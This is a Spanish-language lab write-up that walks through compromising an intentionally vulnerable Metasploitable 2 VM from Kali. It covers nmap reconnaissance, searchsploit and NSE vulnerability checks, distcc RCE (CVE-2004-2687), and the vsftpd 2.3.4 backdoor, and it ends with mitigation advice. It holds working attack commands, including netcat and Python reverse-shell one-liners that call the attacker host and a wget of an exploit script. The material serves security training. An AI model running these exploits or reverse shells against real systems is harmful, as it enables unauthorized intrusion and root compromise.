# Laboratorio-Nmap-to-RCE---Metasploitable

## Introducción
## Entorno de laboratorio

| Rol | Sistema operativo | IP |
|-----|------------------|----|
| Atacante | Kali Linux | 192.168.124.128 |
| Objetivo | Metasploitable 2 | 192.168.124.133 |

Ambas máquinas virtuales corren sobre VMware y están conectadas 
en la misma red NAT (192.168.124.0/24), lo que permite la 
comunicación directa entre ellas.

<img width="718" height="417" alt="image" src="https://github.com/user-attachments/assets/343a9d12-4cae-47ff-87f7-1660578c6929" />
<img width="803" height="425" alt="image" src="https://github.com/user-attachments/assets/e47e2ca1-8bdd-45d5-91a7-5ce229aea962" />

**Verificación de conectividad:**
```bash
ping -c 3 192.168.124.133
```
<img width="567" height="233" alt="image" src="https://github.com/user-attachments/assets/f2b8e032-8825-45d9-8ac2-f9964e2fae93" />


## Fase 1: Reconocimiento de red


El reconocimiento activo consiste en enviar paquetes a la red para 
descubrir qué hosts están activos, sin aún analizar sus servicios.
Se usaron dos herramientas complementarias:

**netdiscover** trabaja a nivel de capa 2 (ARP), preguntando 
"¿quién tiene esta IP?" a toda la red. Es muy sigiloso porque 
usa tráfico que cualquier dispositivo genera normalmente.

**nmap -sn** realiza un ping sweep a nivel de capa 3 (ICMP), 
confirmando qué hosts responden sin escanear puertos.

### Comandos ejecutados
```bash
netdiscover -r 192.168.124.0/24
nmap -sn 192.168.124.0/24 | grep "Nmap scan report for"
```

### Resultado

| IP | Rol identificado |
|----|-----------------|
| 192.168.124.1 | Gateway VMware |
| 192.168.124.128 | Kali Linux (atacante) |
| 192.168.124.133 | Metasploitable 2 (objetivo) |
| 192.168.124.254 | Broadcast VMware |

<img width="775" height="327" alt="image" src="https://github.com/user-attachments/assets/da14a9b4-7d04-485a-aaad-aeacd63adff5" />

**Conclusión:** El host objetivo 192.168.124.133 está activo 
y accesible desde nuestra máquina atacante.








## Fase 2: Escaneo con Nmap / Zenmap

### 2.1 Detección de sistema operativo
```bash
nmap -O 192.168.124.133
```

<img width="857" height="637" alt="image" src="https://github.com/user-attachments/assets/224745b9-0da2-459e-8530-bf6c8ac8ba2b" />

Nmap identificó el objetivo como **Linux 2.6.9 – 2.6.33**, un kernel
antiguo que confirma la naturaleza vulnerable de Metasploitable 2.


### 2.2 Detección de versiones — top 1000 puertos
```bash
nmap -sV 192.168.124.133
```

<img width="1111" height="582" alt="image" src="https://github.com/user-attachments/assets/4105aeb3-6635-4be9-b7af-194c28ca4a62" />

Se identificaron 23 servicios activos con sus versiones exactas.
Versiones destacadas:

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21/tcp | FTP | vsftpd 2.3.4 |
| 22/tcp | SSH | OpenSSH 4.7p1 |
| 80/tcp | HTTP | Apache 2.2.8 |
| 3306/tcp | MySQL | 5.0.51a |
| 5432/tcp | PostgreSQL | 8.3.0 – 8.3.7 |


### 2.3 Escaneo completo — 65535 puertos
```bash
nmap -sV 192.168.124.133 -p-
```

<img width="1026" height="692" alt="image" src="https://github.com/user-attachments/assets/b1282cbc-773e-4d47-aec9-49eecbbe242f" />


El escaneo completo reveló 6 puertos adicionales no presentes en el
top 1000, siendo el más relevante:

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 3632/tcp | distccd | distcc v1 (GNU) 4.2.4 |

> ⚠️ El puerto 3632 (distcc) no aparece en el escaneo por defecto
> de Nmap. Solo es visible con `-p-`. Este servicio será el vector
> de ataque principal en la Fase 4.

### 2.4 Escaneo de puertos específicos y exportación de resultados
```bash
nmap -sV -p21,80 192.168.124.133
nmap -sV -p21,80 192.168.124.133 -oA results
ls results.*
```

<img width="841" height="517" alt="image" src="https://github.com/user-attachments/assets/27400d8e-97fd-468e-9d26-5e793c58faba" />

Nmap permite enfocar el escaneo en puertos concretos con `-p` y
exportar los resultados en tres formatos simultáneamente con `-oA`:

| Archivo | Formato | Uso |
|---------|---------|-----|
| results.nmap | Texto legible | Revisión manual |
| results.gnmap | Grepable | Procesado con scripts |
| results.xml | XML estructurado | Input para otras herramientas |



### 2.5 Escaneo intensivo con Zenmap

Zenmap es la interfaz gráfica oficial de Nmap. El perfil 
"Intense scan" ejecuta internamente:

```bash
nmap -T4 -A -v 192.168.124.133
```

<img width="1917" height="960" alt="image" src="https://github.com/user-attachments/assets/945acd5b-7f96-4552-a10d-7535e2c7c59d" />

El flag `-A` combina cuatro técnicas en un solo comando:

| Flag | Función |
|------|---------|
| `-O` | Detección de sistema operativo |
| `-sV` | Detección de versiones de servicios |
| `-sC` | Ejecución de scripts NSE por defecto |
| `--traceroute` | Trazado de ruta al objetivo |

El flag `-T4` establece el nivel de velocidad (escala 0-5),
acelerando el escaneo a costa de mayor visibilidad en la red.

Hallazgos adicionales revelados por los scripts NSE automáticos:

- FTP anónimo habilitado en vsftpd 2.3.4
- SMB sin firma digital (`message_signing: disabled`)
- SSLv2 soportado en SMTP (protocolo obsoleto y vulnerable)
- Hostname: `metasploitable.localdomain`


> 💡 En un entorno real, un escaneo `-A` sería detectado 
> inmediatamente por cualquier IDS/IPS. Se usa solo en 
> laboratorios o con autorización explícita.






## Fase 3: Identificación de vulnerabilidades (NSE y Searchsploit)

### 3.1 Searchsploit con output de Nmap

Searchsploit puede leer directamente el XML generado por Nmap y 
buscar exploits conocidos para cada servicio detectado:

```bash
searchsploit -x --nmap results.xml
```

<img width="1918" height="793" alt="image" src="https://github.com/user-attachments/assets/c29469e9-c6f6-45d6-b93f-5ba48bc78b05" />

Para vsftpd 2.3.4 se encontraron dos exploits directamente relevantes:

| Exploit | Path |
|---------|------|
| vsftpd 2.3.4 – Backdoor Command Execution | unix/remote/49757.py |
| vsftpd 2.3.4 – Backdoor Command Execution (Metasploit) | unix/remote/17491.rb |



### 3.2 NSE con scripts de vulnerabilidad

El NSE (Nmap Scripting Engine) permite ejecutar scripts especializados
en Lua directamente desde Nmap. El flag `--script vuln` carga todos
los scripts de la categoría "vuln", que verifican activamente si cada
servicio es explotable.

```bash
nmap -sV -p53,6000,111,139,25,23,21,22,445,514,513,512,80,\
1524,1099,2121,3306,3632,5432,5900,2049,6200,6667,6697,\
8009,8180,8787 --script vuln 192.168.124.133
```
<img width="1918" height="1017" alt="image" src="https://github.com/user-attachments/assets/357f1db6-341d-40f5-8595-a12867950586" />


Duración del escaneo: 346 segundos (≈ 6 minutos).

### Vulnerabilidades críticas confirmadas

| Puerto | Servicio | CVE | CVSS | Estado |
|--------|----------|-----|------|--------|
| 21/tcp | vsftpd 2.3.4 | CVE-2011-2523 | 10.0 | VULNERABLE |
| 3632/tcp | distccd v1 | CVE-2004-2687 | 9.3 | VULNERABLE |
| 1099/tcp | Java RMI | — | Alta | VULNERABLE |
| 5432/tcp | PostgreSQL | CVE-2014-0224 | Alta | VULNERABLE |
| 25/tcp | SMTP | CVE-2014-3566 | Media | VULNERABLE |

### Detalle: distcc CVE-2004-2687

El script NSE `distcc-cve2004-2687` confirmó que el servicio distcc
en el puerto 3632 permite ejecutar comandos arbitrarios de forma
remota sin autenticación. La prueba de concepto interna ejecutó `id`
y obtuvo respuesta:

```
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Esto confirma ejecución remota de código (RCE) con el usuario daemon.
Este será el vector de ataque principal en la Fase 4.

<img width="961" height="327" alt="image" src="https://github.com/user-attachments/assets/44299079-3765-45a2-bac3-49abc42b37ac" />






## Fase 4: Explotación - distcc (CVE-2004-2687)

### ¿Qué es distcc y por qué es vulnerable?

distcc es un sistema de compilación distribuida que permite a 
servidores remotos compilar código C/C++ enviado por clientes.
La vulnerabilidad CVE-2004-2687 existe porque versiones anteriores
a la 3.1 no validan ni autentican los comandos recibidos, permitiendo
que cualquier cliente remoto ejecute comandos arbitrarios en el 
servidor disfrazándolos de tareas de compilación.

- Divulgación: 2002-02-01
- CVSSv2: 9.3 (HIGH)
- Vector: AV:N/AC:M/Au:N — Red, sin autenticación requerida

### 4.1 Localizar e inspeccionar el script NSE

```bash
locate distcc-cve2004-2687.nse
mousepad /usr/share/nmap/scripts/distcc-cve2004-2687.nse
```

El script documenta su uso interno:
```
nmap -p 3632 <ip> --script distcc-exec \
  --script-args="distcc-exec.cmd='id'"
```

### 4.2 Verificación de RCE con ifconfig

Se ejecutó el comando `ifconfig` en la máquina víctima de forma
remota usando el script NSE:

```bash
nmap -p 3632 --script distcc-cve2004-2687 \
  --script-args="distcc-cve2004-2687.cmd='ifconfig'" \
  192.168.124.133
```

El output devuelto por Metasploitable confirmó ejecución remota:

```
eth0  inet addr:192.168.124.133  Bcast:192.168.124.255
      Mask:255.255.255.0
```

> ✅ RCE confirmado: comandos ejecutados remotamente en la víctima
> sin credenciales, en el contexto del usuario `daemon`.

<img width="818" height="896" alt="image" src="https://github.com/user-attachments/assets/42322d4a-3af0-4edc-950c-e462d985eebc" />



## Fase 5: Reverse Shell
### Concepto

Una reverse shell invierte la dirección de la conexión: en lugar de
que el atacante se conecte a la víctima, es la víctima quien se
conecta al atacante. Esto permite evadir firewalls que bloquean
conexiones entrantes pero permiten las salientes.

El ataque requiere dos componentes simultáneos:
- Un **listener** en Kali esperando la conexión entrante
- Un **payload** ejecutado en la víctima via distcc que inicia la conexión

### 5.1 Preparar el listener

```bash
nc -nlvp 4444
```

| Flag | Significado |
|------|-------------|
| `-n` | No resolver DNS |
| `-l` | Modo escucha (listen) |
| `-v` | Verbose — mostrar conexiones |
| `-p` | Puerto a escuchar |

### 5.2 Ejecutar el payload via distcc

```bash
nmap -p 3632 --script distcc-cve2004-2687 \
  --script-args="distcc-cve2004-2687.cmd='nc -e /bin/sh 192.168.124.128 4444'" \
  192.168.124.133
```

El comando `nc -e /bin/sh` ordena a netcat que ejecute `/bin/sh`
y conecte su entrada/salida a nuestra IP y puerto.

### 5.3 Conexión establecida

```
connect to [192.168.124.128] from (UNKNOWN) [192.168.124.133] 35902
```

<img width="1918" height="498" alt="image" src="https://github.com/user-attachments/assets/5cde34e5-31f8-45a1-95eb-639be742c012" />

### 5.4 Confirmación de acceso

Una vez establecida la conexión, se confirmó ejecución de comandos
en la máquina víctima:

```
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)

ls
5128.jsvc_up
distcc_20526346.stdout
distcc_267f6346.stderr
gconfd-msfadmin
orbit-msfadmin
```

El directorio de trabajo es `/tmp` de Metasploitable. Los archivos
`distcc_*.stdout` y `distcc_*.stderr` son rastros de las tareas de
compilación que distcc procesó anteriormente.

### 5.5 Upgrade a shell interactiva

La shell obtenida via netcat es no-interactiva: no tiene prompt,
no permite usar Ctrl+C sin cerrar la conexión, y no soporta
comandos como `su`. Se mejora usando el módulo `pty` de Python:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

Esto crea un pseudo-terminal completo, convirtiendo la shell
básica en una sesión bash interactiva con prompt.

<img width="1918" height="491" alt="image" src="https://github.com/user-attachments/assets/b71e45d7-7e51-4a90-a7f9-44ee723e9bc9" />


> 📌 El usuario `daemon` tiene privilegios limitados. En un
> pentest real, el siguiente paso sería escalar privilegios
> hacia root. En este laboratorio continuamos con la
> explotación de vsFTPd que sí otorga acceso root directo.



## Fase 6: Explotación - vsFTPd 2.3.4 (CVE-2011-2523)

### ¿Qué es este backdoor?

En 2011, un atacante desconocido comprometió el repositorio oficial
de vsFTPd e introdujo un backdoor en la versión 2.3.4. El mecanismo
es simple: si el nombre de usuario contiene la cadena `:)` durante
el login FTP, el servidor abre automáticamente una shell en el
puerto 6200 con privilegios de **root**. Fue descubierto y removido
rápidamente, pero Metasploitable lo incluye intencionalmente.

- CVE: CVE-2011-2523
- CVSS: 10.0 (máximo)
- Privilegios obtenidos: root (uid=0)

### 6.1 Descargar y preparar el exploit

```bash
wget https://gist.githubusercontent.com/thaisingle/e2af5a83f06dc91\
fdf60faa23f43ffec/raw/ba8505125ccd2f9ae30c56903f2e817aa96b1854/\
vsFtpdBackdoor.py

chmod +x vsFtpdBackdoor.py
```

El exploit está escrito en Python 2. Al abrirlo con `mousepad` se
puede ver que acepta dos argumentos: IP del objetivo y puerto FTP.

### 6.2 Ejecutar el exploit

```bash
./vsFtpdBackdoor.py 192.168.124.133 21
```

Salida obtenida:
```
[*] Try to open port 6200
[*] Open Port 6200 completed
[*] Pwnage Complete
```

### 6.3 Verificación de acceso root

```
id
uid=0(root) gid=0(root)
```

<img width="377" height="235" alt="image" src="https://github.com/user-attachments/assets/eb1712d4-8b14-421f-89fc-b4b8c5f3931d" />


> ⚠️ A diferencia de distcc que otorgó acceso como `daemon`
> (usuario limitado), vsFTPd 2.3.4 otorga acceso directo como
> `root` — el usuario con máximos privilegios en Linux.
> Esto permite leer cualquier archivo, modificar el sistema,
> crear usuarios, etc.

### 6.4 Upgrade a shell interactiva

La shell obtenida es básica. Para hacerla interactiva:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

<img width="490" height="366" alt="image" src="https://github.com/user-attachments/assets/6bdfcdbe-2230-4bdd-acb6-8a06c7890d7b" />


Para obtener una reverse shell root completa desde esta sesión:

```python
python -c 'import sys,socket,os,pty;\
s=socket.socket();\
s.connect(("192.168.124.128",4444));\
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];\
pty.spawn("/bin/sh")'
```

<img width="1918" height="997" alt="image" src="https://github.com/user-attachments/assets/65d0903f-6957-4637-8f91-b365520f8874" />


## Conclusiones y lecciones aprendidas

### Resumen del ataque

A partir de una máquina en la misma red, se logró comprometer
completamente Metasploitable 2 usando únicamente herramientas
incluidas en Kali Linux, sin credenciales previas.

| Fase | Herramienta | Resultado |
|------|-------------|-----------|
| Reconocimiento | netdiscover, nmap -sn | Host objetivo identificado |
| Escaneo | nmap -O, -sV, Zenmap | 29 puertos mapeados con versiones |
| Vulnerabilidades | NSE --script vuln, searchsploit | 2 vectores críticos confirmados |
| Explotación 1 | distcc NSE script | RCE como daemon (CVE-2004-2687) |
| Reverse shell | netcat + python pty | Shell interactiva en víctima |
| Explotación 2 | vsFtpdBackdoor.py | Root completo (CVE-2011-2523) |

### Lecciones aprendidas

**1. El escaneo completo de puertos es imprescindible.**
El puerto 3632 (distcc) no aparece en el top 1000 de Nmap.
Sin `-p-` habríamos perdido el vector de ataque principal.

**2. Las versiones de software importan más que el servicio.**
vsftpd 2.3.4 parece un servidor FTP normal — solo la versión
exacta revela el backdoor. El version scanning (`-sV`) es
crítico en cualquier auditoría.

**3. Los servicios olvidados son una puerta trasera.**
distcc es una herramienta de desarrollo que no debería estar
expuesta en producción. Servicios innecesarios activos amplían
la superficie de ataque.

**4. Un backdoor en la cadena de suministro es devastador.**
El backdoor de vsFTPd fue introducido en el repositorio oficial.
Esto ilustra la importancia de verificar la integridad del
software descargado (checksums, firmas digitales).

**5. NSE convierte Nmap en una plataforma de explotación.**
Los scripts NSE permiten pasar del descubrimiento a la
explotación sin cambiar de herramienta, haciendo de Nmap
algo mucho más poderoso que un simple escáner de puertos.

### Recomendaciones de mitigación

- Mantener todos los servicios actualizados
- Deshabilitar servicios innecesarios (principio de mínimo privilegio)
- Implementar firewall con reglas de salida estrictas
- Verificar integridad del software con checksums oficiales
- Monitorizar conexiones salientes inusuales (reverse shells)
- Usar IDS/IPS para detectar escaneos intensivos tipo `-A`
